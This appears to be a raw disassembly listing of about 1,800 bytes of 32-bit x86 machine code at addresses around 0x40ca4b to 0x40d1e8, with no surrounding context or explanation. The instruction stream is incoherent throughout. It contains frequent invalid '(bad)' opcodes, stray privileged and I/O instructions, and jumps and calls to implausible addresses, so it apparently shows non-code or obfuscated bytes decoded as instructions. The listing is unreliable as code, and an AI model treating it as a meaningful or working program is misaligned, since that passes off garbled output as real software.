  40ca4b:	push   ebp
  40ca4c:	je     0x40ca3a
  40ca4e:	xor    ecx,DWORD PTR [ebx-0x4899f7cd]
  40ca54:	mov    WORD PTR [esi+0x3c],ss
  40ca57:	and    DWORD PTR [esp+eax*8-0x75],0xc9425fff
  40ca5f:	add    BYTE PTR [ebp+0x57],dl
  40ca62:	in     al,dx
  40ca63:	(bad)  
  40ca64:	push   esi
  40ca65:	mov    edx,0x89360045
  40ca6a:	pushf  
  40ca6b:	cld    
  40ca6c:	mov    esi,0xf874853b
  40ca71:	mov    edx,edx
  40ca73:	or     bh,bh
  40ca75:	ret    0x4566
  40ca78:	or     bl,ch
  40ca7a:	or     BYTE PTR [ebx-0x7699f800],cl
  40ca80:	retf   0x4283
  40ca83:	add    al,BYTE PTR [eax]
  40ca85:	mov    bh,0x66
  40ca87:	adc    dl,cl
  40ca89:	iret   
  40ca8a:	mov    edx,0x66c400c7
  40ca8f:	dec    edx
  40ca91:	(bad)  
  40ca92:	push   edi
  40ca93:	mov    edx,0x66b70057
  40ca98:	mov    edx,0xffdf8df8
  40ca9d:	rcl    BYTE PTR [edi+0x66],0x51
  40caa1:	add    bh,BYTE PTR [ebx+0x5e4f45]
  40caa7:	ret    0x3b
  40caaa:	jne    0x40ca37
  40caac:	mov    DWORD PTR [ebx+0x457218fc],eax
  40cab2:	xor    esi,DWORD PTR ds:0xc7339c8b
  40cab8:	callw  0x5048
  40cabc:	cmp    al,0xf8
  40cabe:	fs inc ebp
  40cac0:	mov    ebx,0x83b35
  40cac5:	pop    es
  40cac6:	sub    ebx,DWORD PTR [esi-0x7675cd45]
  40cacc:	add    al,bh
  40cace:	xor    eax,DWORD PTR [ebp-0x45]
  40cad1:	cmp    eax,0xc7009c4e
  40cad6:	cmp    esi,esp
  40cad8:	jne    0x40ca5f
  40cada:	cmp    eax,0x338545fc
  40cae0:	clc    
  40cae1:	pushf  
  40cae2:	pop    ebx
  40cae3:	mov    eax,DWORD PTR ds:0xeb57c0ec
  40cae9:	push   ecx
  40caea:	xor    ecx,DWORD PTR [ebx-0x7b3c07a2]
  40caf0:	mov    ebx,DWORD PTR [esi-0x74bacdaf]
  40caf6:	psubsb mm1,QWORD PTR [eax]
  40caf9:	icebp  
  40cafa:	lea    ecx,[eax]
  40cafc:	clc    
  40cafd:	pop    es
  40cafe:	inc    ecx
  40cb00:	mov    esi,0x8a72
  40cb05:	push   ebp
  40cb06:	xor    ecx,DWORD PTR [edi]
  40cb08:	mov    edi,0xc24ed1
  40cb0d:	adc    DWORD PTR [ebp+0x0],0x66
  40cb11:	add    bh,al
  40cb13:	inc    ebp
  40cb14:	sub    ecx,DWORD PTR [ebx-0x3ed407bb]
  40cb1a:	mov    DWORD PTR [ebp+0x8],ecx
  40cb1d:	add    DWORD PTR [ebx],0x66514557
  40cb23:	or     DWORD PTR [edx],0xf32c29e
  40cb29:	cmp    edi,DWORD PTR [esi+esi*2]
  40cb2c:	mov    ecx,DWORD PTR [ebx+0x45f80881]
  40cb32:	dec    DWORD PTR [ebx+0x4db80c33]
  40cb38:	dec    esi
  40cb39:	mov    eax,DWORD PTR [eax]
  40cb3b:	mov    DWORD PTR [ebx],edi
  40cb3d:	mov    esi,DWORD PTR [ebp+0x4]
  40cb40:	xor    ecx,DWORD PTR [eax+0x5f]
  40cb43:	mov    ecx,DWORD PTR [ecx-0x3a87410]
  40cb49:	push   ecx
  40cb4a:	leave  
  40cb4b:	mov    eax,DWORD PTR [eax+edi*8]
  40cb4e:	push   ebp
  40cb4f:	test   ah,ch
  40cb51:	sahf   
  40cb52:	in     al,dx
  40cb53:	xor    al,bh
  40cb55:	mov    esp,ebp
  40cb57:	clc    
  40cb58:	test   DWORD PTR [ebp-0x74baff08],ebx
  40cb5e:	xor    al,0x10
  40cb60:	pushf  
  40cb61:	dec    ebp
  40cb62:	mov    ebp,DWORD PTR [ebx]
  40cb64:	in     al,dx
  40cb65:	mov    edx,DWORD PTR [edi-0xc]
  40cb68:	push   ecx
  40cb69:	icebp  
  40cb6a:	add    eax,0x77208
  40cb6f:	rol    DWORD PTR [ebp+0x72],0xc7
  40cb73:	add    al,dh
  40cb75:	rol    DWORD PTR [ebp+0x4545f827],0x3
  40cb7c:	xor    eax,edi
  40cb7e:	pushf  
  40cb7f:	dec    ebp
  40cb80:	mov    DWORD PTR [ebx],0x985f8fc
  40cb86:	clc    
  40cb87:	or     BYTE PTR [ebp+0x45],al
  40cb8a:	xor    eax,0x7080835
  40cb8f:	pop    es
  40cb90:	dec    ebp
  40cb91:	dec    ebp
  40cb92:	lea    ecx,[ebp+0x72720101]
  40cb98:	add    BYTE PTR [eax],al
  40cb9a:	dec    ebp
  40cb9b:	inc    ebp
  40cb9c:	sub    ebx,0x10518b57
  40cba2:	or     DWORD PTR [ebp-0x62],0x8b8b322b
  40cba9:	cld    
  40cbaa:	adc    cl,dh
  40cbac:	scas   eax,DWORD PTR es:[edi]
  40cbad:	or     BYTE PTR [ebx],bh
  40cbaf:	pop    es
  40cbb0:	xadd   ebp,ebp
  40cbb3:	jb     0x40cbb5
  40cbb5:	add    BYTE PTR [ebx+0x4d2910c1],cl
  40cbbb:	inc    ebp
  40cbbc:	sub    eax,DWORD PTR [ebx]
  40cbbe:	mov    edi,eax
  40cbc0:	lock dec ebp
  40cbc2:	icebp  
  40cbc3:	add    ecx,DWORD PTR [eax]
  40cbc5:	clc    
  40cbc6:	pop    es
  40cbc7:	mov    eax,ecx
  40cbc9:	data16 jb 0x40cbd4
  40cbcc:	add    BYTE PTR [ebp-0x3f],al
  40cbcf:	xor    eax,0x7450830
  40cbd4:	add    ecx,DWORD PTR [ebp-0x8]
  40cbd7:	lea    ecx,[ebp+0x1]
  40cbda:	add    esi,DWORD PTR [edx-0x8]
  40cbdd:	add    BYTE PTR [ecx],dl
  40cbdf:	inc    ebp
  40cbe0:	adc    bl,ch
  40cbe2:	dec    ecx
  40cbe3:	mov    ecx,DWORD PTR [ecx+0x45450408]
  40cbe9:	mov    esi,DWORD PTR ds:0x74d080c
  40cbef:	mov    cl,BYTE PTR [ebp-0x78]
  40cbf2:	lea    ecx,[ebx-0x768d07ff]
  40cbf8:	add    al,bh
  40cbfa:	inc    ebp
  40cbfb:	in     al,0xe9
  40cbfd:	inc    DWORD PTR [eax]
  40cbff:	leave  
  40cc00:	add    BYTE PTR [eax*2-0x71374ab],cl
  40cc07:	push   ecx
  40cc08:	rol    DWORD PTR [ebp+0x4d],0x35
  40cc0c:	sbb    DWORD PTR [edi+edx*2-0x7e07ae39],0x32f89e85
  40cc17:	sar    BYTE PTR [ebx],0x74
  40cc1a:	jbe    0x40cba7
  40cc1c:	mov    edi,esp
  40cc1e:	or     BYTE PTR [edi+0x45],dl
  40cc21:	push   ecx
  40cc22:	mov    eax,DWORD PTR ds:0x4d720c
  40cc28:	mov    eax,DWORD PTR [ebp-0x77]
  40cc2b:	jne    0x40cbb8
  40cc2d:	jmp    0x40cc23
  40cc2f:	mov    edx,DWORD PTR [edi-0x8]
  40cc32:	push   ecx
  40cc33:	push   edi
  40cc34:	mov    edx,DWORD PTR [ecx-0x8]
  40cc37:	add    eax,0x9e7284
  40cc3c:	xor    cl,BYTE PTR [ebp-0x77]
  40cc3f:	sub    edi,eax
  40cc41:	mov    DWORD PTR [ebx+0xc],ebx
  40cc44:	inc    ebp
  40cc45:	inc    ebp
  40cc46:	mov    esi,DWORD PTR ds:0x7c108f8
  40cc4c:	dec    ebp
  40cc4d:	sahf   
  40cc4e:	xor    DWORD PTR [edx],0x8518b57
  40cc54:	or     DWORD PTR [ebp-0x62],0x3beb3288
  40cc5b:	leave  
  40cc5c:	jbe    0x40cc66
  40cc5e:	mov    edx,DWORD PTR [ebp+0x8]
  40cc61:	in     al,dx
  40cc62:	inc    ebp
  40cc63:	in     al,dx
  40cc64:	mov    eax,DWORD PTR [edx]
  40cc66:	or     al,0x0
  40cc68:	dec    ebp
  40cc69:	inc    ebp
  40cc6a:	xor    ax,0x9c09
  40cc6e:	mov    edi,eax
  40cc70:	mov    esi,eax
  40cc72:	cld    
  40cc73:	test   DWORD PTR [edi-0x8],edx
  40cc76:	push   ecx
  40cc77:	inc    ebp
  40cc78:	mov    ecx,DWORD PTR [ebx-0x3f7bf708]
  40cc7e:	sahf   
  40cc7f:	pop    es
  40cc80:	xor    al,al
  40cc82:	mov    DWORD PTR [ebp-0x74e8ff08],esp
  40cc88:	inc    ebp
  40cc89:	or     al,0x3
  40cc8b:	sar    al,0xf2
  40cc8e:	dec    ebp
  40cc8f:	lea    eax,[ebx]
  40cc91:	in     al,0xf8
  40cc93:	dec    DWORD PTR [ecx]
  40cc95:	mov    DWORD PTR [eax],ecx
  40cc97:	cld    
  40cc98:	inc    ebp
  40cc99:	inc    ebp
  40cc9a:	inc    eax
  40cc9b:	mov    DWORD PTR [ebp-0x14],eax
  40cc9e:	jmp    0xff97cae8
  40cca3:	mov    edi,0x70008c2
  40cca8:	mov    eax,edi
  40ccaa:	push   ecx
  40ccab:	sahf   
  40ccac:	(bad)  
  40ccad:	xor    bh,ah
  40ccaf:	add    eax,DWORD PTR [ebp+0x4510f889]
  40ccb5:	inc    ebp
  40ccb6:	xor    al,0xe8
  40ccb8:	pushf  
  40ccb9:	std    
  40ccba:	xor    edi,edi
  40ccbc:	inc    eax
  40ccbd:	fadd   DWORD PTR [eax+0x45]
  40ccc0:	inc    ebp
  40ccc1:	mov    esi,DWORD PTR ds:0x7510814
  40ccc7:	inc    ebp
  40ccc8:	sahf   
  40ccc9:	xor    DWORD PTR [edx],0x8
  40cccc:	cmp    DWORD PTR [ebp+0xc],eax
  40cccf:	mov    eax,DWORD PTR [edx]
  40ccd1:	clc    
  40ccd2:	sub    al,0x40
  40ccd4:	inc    ebp
  40ccd5:	call   0xff49c80f
  40ccda:	pop    es
  40ccdb:	inc    ebp
  40ccdc:	sahf   
  40ccdd:	push   DWORD PTR [edx]
  40ccdf:	adc    BYTE PTR [ebx-0x3717f3ab],cl
  40cce5:	std    
  40cce6:	dec    ebp
  40cce7:	dec    DWORD PTR [ebx+0x5708fcdb]
  40cced:	inc    ebp
  40ccee:	push   ecx
  40ccef:	call   0xffb3c8f9
  40ccf4:	add    BYTE PTR [ebp+0x4d],al
  40ccf7:	xor    eax,DWORD PTR [ebx]
  40ccf9:	add    ecx,DWORD PTR [eax+edx*2]
  40ccfc:	add    DWORD PTR [ebp-0x45],esi
  40ccff:	inc    edx
  40cd01:	cld    
  40cd02:	add    BYTE PTR [ecx],dh
  40cd04:	mov    edi,edi
  40cd06:	or     DWORD PTR [ebx-0x30ff0be4],0xc1f4cec7
  40cd10:	test   DWORD PTR [esi],ebx
  40cd12:	clc    
  40cd13:	inc    ebp
  40cd14:	inc    ebp
  40cd15:	mov    esi,DWORD PTR [ecx+ecx*4]
  40cd18:	pushf  
  40cd19:	or     al,0x8b
  40cd1b:	inc    ebp
  40cd1c:	adc    BYTE PTR [ebx-0x3f7af3bb],cl
  40cd22:	jne    0x40cd5f
  40cd24:	xor    esi,DWORD PTR [ebp-0x17]
  40cd27:	xor    eax,DWORD PTR [eax]
  40cd29:	pop    edi
  40cd2a:	add    BYTE PTR [ebx+0x45],bl
  40cd2d:	ret    0x85
  40cd30:	je     0x40cd77
  40cd32:	push   ebx
  40cd33:	mov    eax,DWORD PTR [ebp-0xe02e8]
  40cd39:	mov    eax,DWORD PTR [ebp-0x75]
  40cd3c:	mov    ecx,DWORD PTR [esp+ecx*1]
  40cd3f:	in     al,dx
  40cd40:	inc    ebp
  40cd41:	or     DWORD PTR [ebx+0x5753f408],0x57
  40cd48:	push   edi
  40cd49:	test   BYTE PTR [ecx+0x0],dl
  40cd4c:	xor    eax,DWORD PTR [eax]
  40cd4e:	mov    esi,0x8472c0
  40cd53:	add    dh,al
  40cd55:	add    BYTE PTR [ebp-0x49],al
  40cd58:	mov    esp,DWORD PTR [eax]
  40cd5a:	or     al,0xc8
  40cd5c:	add    BYTE PTR [ebp-0x1],al
  40cd5f:	xor    ecx,DWORD PTR [ebx+0x8f88b21]
  40cd65:	inc    edx
  40cd66:	inc    eax
  40cd67:	add    bl,ch
  40cd69:	xor    ecx,DWORD PTR [ebx-0x17f7f37f]
  40cd6f:	add    BYTE PTR [ecx+0x45f4f889],cl
  40cd75:	mov    eax,DWORD PTR gs:[eax]
  40cd78:	sub    cl,cl
  40cd7a:	retf   0xff7e
  40cd7d:	mov    WORD PTR [ebp+0x10],cx
  40cd81:	jae    0x40cdf8
  40cd83:	lea    ecx,[ebx+0x63fffcf8]
  40cd89:	xor    edi,edi
  40cd8b:	jne    0x8bcc42de
  40cd91:	or     al,0xfc
  40cd93:	or     al,0x3e
  40cd95:	push   WORD PTR [ecx-0x75]
  40cd99:	jne    0x40cd8b
  40cd9b:	cmpxchg8b QWORD PTR [ecx]
  40cd9e:	(bad)  
  40cd9f:	mov    edx,0x66ec00ff
  40cda4:	jne    0x40cd75
  40cda6:	call   0xff9ec6b7
  40cdab:	cmovge edi,edx
  40cdae:	xor    edi,DWORD PTR [ebx+eax*1]
  40cdb1:	add    BYTE PTR [ebx],bh
  40cdb3:	sub    eax,0xf8b5d74
  40cdb8:	or     al,0xfa
  40cdba:	add    BYTE PTR [edi],cl
  40cdbc:	inc    ebp
  40cdbd:	cmp    al,0x8b
  40cdbf:	mov    ebx,0x4d3b08
  40cdc4:	sub    DWORD PTR [ebx],0x14
  40cdc7:	enterw 0x9ff8,0x3b
  40cdcc:	shl    BYTE PTR [esi+ebx*2+0x6a],0xc9
  40cdd1:	pop    edi
  40cdd2:	or     al,0x45
  40cdd4:	mov    esp,DWORD PTR [esi-0x8]
  40cdd7:	dec    ebp
  40cdd8:	inc    eax
  40cdd9:	data16 jmp 0x40ce29
  40cddc:	push   ebp
  40cddd:	jb     0x40cdcb
  40cddf:	jmp    0x40ce26
  40cde1:	inc    DWORD PTR [ebx+0x7d7f10f8]
  40cde7:	mov    eax,DWORD PTR [eax]
  40cde9:	or     BYTE PTR [esi-0x49],dl
  40cdec:	jo     0x7440ffa1
  40cdf2:	test   DWORD PTR [edx+0xf],eax
  40cdf5:	jmp    DWORD PTR [edi+0xf77000f]
  40cdfb:	inc    DWORD PTR [eax+0x33]
  40cdfe:	mov    ebx,DWORD PTR [edi-0x77]
  40ce01:	pop    ebx
  40ce02:	lock ret 0xd2
  40ce06:	push   ebp
  40ce07:	dec    ebp
  40ce08:	mov    eax,0xf88a81
  40ce0d:	dec    eax
  40ce0f:	ror    ax,0x3b
  40ce13:	rol    BYTE PTR [eax],0x3b
  40ce16:	dec    ebp
  40ce17:	lock adc DWORD PTR [esp+edi*8+0x6a5533eb],0xffffffec
  40ce20:	pop    edi
  40ce21:	in     al,dx
  40ce22:	cmp    edx,DWORD PTR [edi-0xc]
  40ce25:	clc    
  40ce26:	xchg   DWORD PTR fs:[edx-0xff3bff],esi
  40ce2d:	cmp    al,dh
  40ce2f:	jne    0x40cde8
  40ce31:	xor    edi,esp
  40ce33:	jmp    0xcdcf95
  40ce38:	mov    ebp,DWORD PTR [ecx+edi*1]
  40ce3b:	jne    0x40ce3f
  40ce3d:	call   0xfff8cb79
  40ce42:	mov    edi,0x14e97
  40ce47:	add    BYTE PTR [ebx],bh
  40ce49:	inc    edi
  40ce4a:	jne    0x40cdd5
  40ce4c:	mov    esi,DWORD PTR [eax+ecx*1-0x7f7648b9]
  40ce53:	mov    eax,0x8974471f
  40ce58:	mov    edi,DWORD PTR [eax+ecx*1+0x6600b787]
  40ce5f:	add    BYTE PTR [esi+0x88d1f45],bh
  40ce65:	stos   BYTE PTR es:[edi],al
  40ce66:	add    BYTE PTR [eax],al
  40ce68:	mov    bx,di
  40ce6b:	les    esi,FWORD PTR [ebx]
  40ce6d:	xchg   DWORD PTR [esi+0x0],esp
  40ce70:	iret   
  40ce71:	add    BYTE PTR [edx],dl
  40ce73:	inc    ebp
  40ce74:	jl     0x40ce03
  40ce76:	(bad)  
  40ce77:	out    dx,al
  40ce78:	cld    
  40ce79:	add    BYTE PTR [ebx+0x39ccf489],cl
  40ce7f:	xchg   esp,edi
  40ce81:	add    DWORD PTR [eax+eax*1-0x72babafa],ebp
  40ce88:	push   0x32
  40ce8a:	pop    edi
  40ce8b:	add    BYTE PTR [ebp-0x77],dh
  40ce8e:	paddq  mm1,mm2
  40ce91:	xchg   DWORD PTR [ecx+eax*1],edi
  40ce94:	add    BYTE PTR [eax],al
  40ce96:	adc    ecx,DWORD PTR [ecx+0x457cb083]
  40ce9c:	test   eax,ebp
  40ce9e:	inc    DWORD PTR [eax]
  40cea0:	inc    DWORD PTR [eax]
  40cea2:	ror    BYTE PTR [ebx+0xc9a85e],0x8
  40cea9:	dec    DWORD PTR [ebx-0x3e020718]
  40ceaf:	inc    esp
  40ceb1:	inc    ebp
  40ceb2:	inc    DWORD PTR [ebp-0x52ccf0cd]
  40ceb8:	data16 add BYTE PTR [ebp-0x75],cl
  40cebc:	(bad)  
  40cebe:	rcl    BYTE PTR [esi-0x1e],0x74
  40cec2:	mov    edi,DWORD PTR [eax-0x7d]
  40cec5:	lock push eax
  40cec7:	jle    0x40ce54
  40cec9:	mov    ecx,DWORD PTR [ebx+0x56a81c]
  40cecf:	mov    eax,DWORD PTR [ebx+0x7f80018]
  40ced5:	jge    0x40ce97
  40ced7:	mov    esi,DWORD PTR [eax]
  40ced9:	adc    al,0x0
  40cedb:	enter  0xd06a,0xff
  40cedf:	dec    ebp
  40cee0:	or     BYTE PTR [ecx+0x7dffe4c1],cl
  40cee6:	mov    edi,DWORD PTR [ebx]
  40cee8:	lods   al,BYTE PTR ds:[esi]
  40cee9:	ja     0x40ceeb
  40ceeb:	mov    DWORD PTR [ebp+0x45db22f8],ecx
  40cef1:	pop    ebp
  40cef2:	lea    edi,[ecx]
  40cef4:	inc    esp
  40cef5:	clc    
  40cef6:	inc    ebp
  40cef7:	outs   dx,BYTE PTR ds:[esi]
  40cef8:	lea    eax,[ebx]
  40cefa:	push   bp
  40cefc:	inc    ebp
  40cefd:	mov    ecx,DWORD PTR [ebp+0xb788e0]
  40cf03:	pop    edi
  40cf04:	mov    DWORD PTR [esi-0x40],ebx
  40cf07:	jae    0x40ce90
  40cf09:	cmp    eax,DWORD PTR [eax]
  40cf0b:	adc    al,0x0
  40cf0d:	pop    eax
  40cf0e:	inc    ebp
  40cf0f:	sbb    al,0x8d
  40cf11:	mov    ecx,esp
  40cf13:	or     BYTE PTR [eax],al
  40cf15:	cmp    al,0x89
  40cf17:	mov    eax,ecx
  40cf19:	cld    
  40cf1a:	xchg   DWORD PTR [ebp+0x0],edx
  40cf1d:	add    eax,DWORD PTR [eax]
  40cf1f:	add    eax,DWORD PTR [ebp+0x2b]
  40cf22:	lea    ecx,[eax]
  40cf24:	adc    BYTE PTR [ebp+0x0],al
  40cf27:	or     ecx,DWORD PTR [ecx-0x78763000]
  40cf2d:	fadd   QWORD PTR [ecx]
  40cf2f:	push   ebp
  40cf30:	add    BYTE PTR [ebx+0x1b8d0045],al
  40cf36:	push   esp
  40cf37:	inc    ebp
  40cf38:	add    bh,bh
  40cf3a:	push   edi
  40cf3b:	adc    BYTE PTR [ebp-0x18],bh
  40cf3e:	mov    ebp,edi
  40cf40:	fdivr  st,st(7)
  40cf42:	cli    
  40cf43:	dec    ebp
  40cf44:	add    BYTE PTR [ebp-0x74788bb0],al
  40cf4a:	add    esp,edi
  40cf4c:	add    BYTE PTR [eax],bh
  40cf4e:	xor    BYTE PTR [ebp-0x51],al
  40cf51:	cmp    edi,0xfffffffc
  40cf54:	mov    edi,edi
  40cf56:	lock in al,dx
  40cf58:	rcl    ah,0x84
  40cf5b:	pop    ebp
  40cf5c:	add    BYTE PTR [ebx+0x0],al
  40cf5f:	pop    ebp
  40cf60:	dec    eax
  40cf61:	cmp    edx,DWORD PTR [ebx-0x8]
  40cf64:	mov    edx,DWORD PTR [ecx+eax*1-0x7436fca5]
  40cf6b:	add    al,0x24
  40cf6d:	push   ebp
  40cf6e:	dec    esi
  40cf6f:	in     al,dx
  40cf70:	mov    eax,DWORD PTR [ebp+0x20]
  40cf73:	push   esi
  40cf74:	pop    esi
  40cf75:	mov    al,0x3
  40cf77:	add    DWORD PTR [ecx+0x7eb0e000],ecx
  40cf7d:	add    DWORD PTR [ebx],eax
  40cf7f:	add    BYTE PTR [ebx],al
  40cf81:	inc    ebp
  40cf82:	mov    eax,ebp
  40cf84:	hlt    
  40cf85:	(bad)  
  40cf86:	push   ebp
  40cf87:	dec    DWORD PTR [ecx-0x4fe07f2]
  40cf8d:	push   es
  40cf8e:	add    ecx,ecx
  40cf90:	pop    ebp
  40cf91:	or     BYTE PTR [ebx],dh
  40cf93:	jns    0x5e02b85a
  40cf99:	ret    0x76
  40cf9c:	jmp    0x40cf2d
  40cf9e:	mov    eax,DWORD PTR [ecx]
  40cfa0:	in     al,0x0
  40cfa2:	jge    0x40cf8f
  40cfa4:	sysexit 
  40cfa6:	cmp    al,0x8a
  40cfa8:	cmp    eax,DWORD PTR [eax]
  40cfaa:	sbb    BYTE PTR [eax],cl
  40cfac:	pop    ebp
  40cfad:	add    BYTE PTR [esi+0x66],bh
  40cfb0:	jae    0x40cfb3
  40cfb2:	mov    eax,ecx
  40cfb4:	call   0xb9b7:0x8b025583
  40cfbb:	mov    ebx,0x8d4e55
  40cfc0:	mov    al,0x3b
  40cfc2:	fdiv   DWORD PTR [ebp-0x8]
  40cfc5:	xor    edx,DWORD PTR [ebp+0x66]
  40cfc8:	mov    DWORD PTR [ecx],0x10087ec
  40cfce:	add    BYTE PTR [eax],al
  40cfd0:	push   ebp
  40cfd1:	ret    
  40cfd2:	mov    ecx,DWORD PTR [ebx-0x77c57404]
  40cfd8:	jne    0x40cfda
  40cfda:	mov    eax,ecx
  40cfdc:	fadd   QWORD PTR [esi]
  40cfde:	xor    al,0xc7
  40cfe0:	push   ebx
  40cfe1:	or     dh,dh
  40cfe3:	icebp  
  40cfe4:	inc    DWORD PTR [eax+0x8f4358b]
  40cfea:	rol    BYTE PTR [edx+0x5],0xa
  40cfee:	inc    ebp
  40cfef:	stc    
  40cff0:	mov    DWORD PTR [ebp-0x75],esi
  40cff3:	(bad)  
  40cff4:	lock add BYTE PTR [ebp-0x7a],al
  40cff8:	add    al,0x1
  40cffa:	dec    ebp
  40cffb:	add    BYTE PTR [ebp-0x39],dh
  40cffe:	mov    eax,ebx
  40d000:	call   0xe8c45990
  40d005:	sbb    al,0x5d
  40d007:	mov    edi,0xf85e8572
  40d00c:	pop    edi
  40d00d:	jge    0x40cfd1
  40d00f:	lea    eax,[eax]
  40d011:	dec    DWORD PTR [ebx+0x88b8b45]
  40d017:	or     bh,bh
  40d019:	leave  
  40d01a:	fadd   DWORD PTR [eax+eax*1-0x67ff7300]
  40d021:	dec    ebp
  40d022:	add    BYTE PTR [ebp-0xff7f075],al
  40d028:	xchg   ebp,eax
  40d029:	add    bh,bh
  40d02b:	mov    ecx,DWORD PTR [ebx-0x74b276f0]
  40d031:	mov    esi,DWORD PTR [ebx]
  40d033:	or     al,0x39
  40d035:	dec    ebp
  40d036:	pop    esi
  40d037:	mov    edx,DWORD PTR [ebp+0x5d458b08]
  40d03d:	in     al,0x4
  40d03f:	pushf  
  40d040:	mov    ecx,DWORD PTR [ecx-0x76ff1378]
  40d046:	push   ebx
  40d047:	call   0xc83595f
  40d04c:	add    BYTE PTR [ebp+0x5],cl
  40d04f:	(bad)  
  40d050:	cmp    edx,DWORD PTR [eax]
  40d052:	add    BYTE PTR [ebp+0x5783f889],al
  40d058:	add    dl,BYTE PTR [ecx-0x3e]
  40d05b:	mov    ebx,0xff028d0f
  40d060:	mov    edx,0x66330045
  40d065:	mov    eax,ebx
  40d067:	sub    esp,eax
  40d069:	add    eax,eax
  40d06b:	clc    
  40d06c:	mov    DWORD PTR [ebx-0x7477ff75],edx
  40d072:	add    BYTE PTR [ebx+ebx*2],cl
  40d075:	dec    ebp
  40d076:	push   edi
  40d077:	xor    edi,eax
  40d079:	xor    eax,DWORD PTR [esi+0x8018d]
  40d07f:	in     eax,0xe7
  40d081:	add    BYTE PTR [ebx],al
  40d083:	inc    ebp
  40d084:	jmp    0x40d0b9
  40d086:	xor    bh,0x49
  40d089:	mov    ebp,ecx
  40d08b:	adc    BYTE PTR [eax-0x75ccbfb3],cl
  40d091:	xor    eax,DWORD PTR [eax-0x10c483d5]
  40d097:	jne    0x40d099
  40d099:	mov    ecx,DWORD PTR [ebx+0x458808]
  40d09f:	mov    eax,DWORD PTR [ebx]
  40d0a1:	hlt    
  40d0a2:	pop    edi
  40d0a3:	add    BYTE PTR [ebp-0x37],dl
  40d0a6:	in     al,dx
  40d0a7:	push   es
  40d0a8:	in     al,dx
  40d0a9:	dec    ecx
  40d0aa:	push   edi
  40d0ab:	xor    eax,0x4d9c1735
  40d0b0:	mov    DWORD PTR [eax+0x624757e8],eax
  40d0b6:	mov    ecx,edx
  40d0b8:	in     al,0x4d
  40d0ba:	dec    ebp
  40d0bb:	add    BYTE PTR [ebp-0x43df0a9],0xe9
  40d0c2:	add    dl,dl
  40d0c4:	mov    ecx,DWORD PTR [ebx+0x4dc9080c]
  40d0ca:	test   BYTE PTR [eax+0x8008b00],cl
  40d0d0:	dec    ebp
  40d0d1:	push   ebp
  40d0d2:	mov    DWORD PTR [eax+0x4d72f4],edi
  40d0d8:	mov    eax,ecx
  40d0da:	clc    
  40d0db:	into   
  40d0dc:	dec    ebp
  40d0dd:	retf   0x18c7
  40d0e0:	lock dec ebp
  40d0e2:	test   DWORD PTR [ebx-0x31baf308],ecx
  40d0e8:	push   ebx
  40d0e9:	(bad)  
  40d0ea:	jge    0x40d0b6
  40d0ec:	push   esi
  40d0ed:	enter  0xce45,0x89
  40d0f1:	dec    ebp
  40d0f2:	cld    
  40d0f3:	jmp    0xff74d03d
  40d0f8:	pushf  
  40d0f9:	inc    ebp
  40d0fa:	mov    esi,0x78b0833
  40d0ff:	sub    esp,DWORD PTR [edx+0x3]
  40d102:	int    0x8
  40d104:	mov    ecx,DWORD PTR [ebp+0xc]
  40d107:	mov    eax,esi
  40d109:	adc    bl,cl
  40d10b:	(bad)  
  40d10c:	enter  0x4d85,0xff
  40d110:	jmp    0x85d214
  40d115:	xor    eax,DWORD PTR [ebp+0x5e]
  40d118:	mov    ebp,ebx
  40d11a:	or     al,0x8b
  40d11c:	(bad)  
  40d11d:	call   0x51cd28f0
  40d122:	cmp    al,0x5
  40d124:	fs jb  0x40d0b2
  40d127:	add    BYTE PTR [eax],cl
  40d129:	leave  
  40d12a:	ror    BYTE PTR [ecx+esi*8],cl
  40d12d:	push   ebp
  40d12e:	inc    ebp
  40d12f:	in     al,dx
  40d130:	mov    ebp,esp
  40d132:	or     al,0xc7
  40d134:	(bad)  
  40d135:	lock into 
  40d137:	test   ecx,eax
  40d139:	clc    
  40d13a:	rol    BYTE PTR [ebp+0x34],1
  40d13d:	xor    al,0x45
  40d13f:	pushf  
  40d140:	add    ecx,DWORD PTR [ebx-0x7b27604]
  40d146:	mov    al,BYTE PTR [ebp-0x7b]
  40d149:	cmp    eax,0x56349c75
  40d14e:	sub    al,0xc7
  40d150:	jmp    0x40d13e
  40d152:	mov    ebx,DWORD PTR [eax]
  40d154:	lock jmp 0xf02a:0x8bb27df1
  40d15c:	mov    edx,DWORD PTR [edi-0x14]
  40d15f:	push   ecx
  40d160:	icebp  
  40d161:	xor    eax,DWORD PTR [edx]
  40d163:	mov    edx,0x627280
  40d168:	enter  0x4dc8,0xfa
  40d16c:	add    ecx,edx
  40d16e:	cld    
  40d16f:	scas   eax,DWORD PTR es:[edi]
  40d170:	add    ebx,ebp
  40d172:	dec    ebp
  40d173:	mov    ecx,DWORD PTR [ebx-0x618a1708]
  40d179:	xor    esi,DWORD PTR [edx]
  40d17b:	xor    ebp,DWORD PTR [ebx]
  40d17d:	add    esi,DWORD PTR [ebx]
  40d17f:	add    edi,DWORD PTR [ebx]
  40d181:	test   DWORD PTR [ebp-0x75],esi
  40d184:	mov    edi,eax
  40d186:	adc    BYTE PTR [ebp+0x55],cl
  40d189:	je     0x40d1be
  40d18b:	xor    esi,DWORD PTR [ebx]
  40d18d:	xor    ebp,DWORD PTR [ebx]
  40d18f:	add    ebp,DWORD PTR [ebx]
  40d191:	add    esi,DWORD PTR [ebx]
  40d193:	ror    DWORD PTR [ecx+0x68ec108b],cl
  40d199:	enter  0xcaff,0x8b
  40d19d:	icebp  
  40d19e:	or     al,0xa
  40d1a0:	(bad)  
  40d1a1:	lock retf 
  40d1a3:	enter  0xf2c8,0x4d
  40d1a7:	retf   0xee89
  40d1aa:	or     BYTE PTR [ebp+0x45],dh
  40d1ad:	mov    edi,DWORD PTR [ebx]
  40d1af:	cld    
  40d1b0:	bswap  eax
  40d1b2:	pop    edi
  40d1b3:	mov    esp,0x328b9eff
  40d1b8:	in     al,0x8b
  40d1ba:	(bad)  
  40d1bb:	hlt    
  40d1bc:	pop    ebx
  40d1bd:	jne    0x40d1c7
  40d1bf:	xor    eax,DWORD PTR [ebp+0x33]
  40d1c2:	xor    eax,0x73b082b
  40d1c7:	jbe    0x40d167
  40d1c9:	mov    esi,DWORD PTR [edx]
  40d1cb:	clc    
  40d1cc:	pop    edi
  40d1cd:	mov    edx,eax
  40d1cf:	mov    eax,DWORD PTR [eax]
  40d1d1:	clc    
  40d1d2:	mov    ecx,ecx
  40d1d4:	adc    DWORD PTR [ebp+0x14],0xffffffec
  40d1d8:	inc    ebp
  40d1d9:	in     al,dx
  40d1da:	xor    eax,0xc7009c04
  40d1df:	inc    ebp
  40d1e0:	cld    
  40d1e1:	xor    eax,0xc7f89c85
  40d1e6:	add    esi,esp
  40d1e8:	inc    ebp
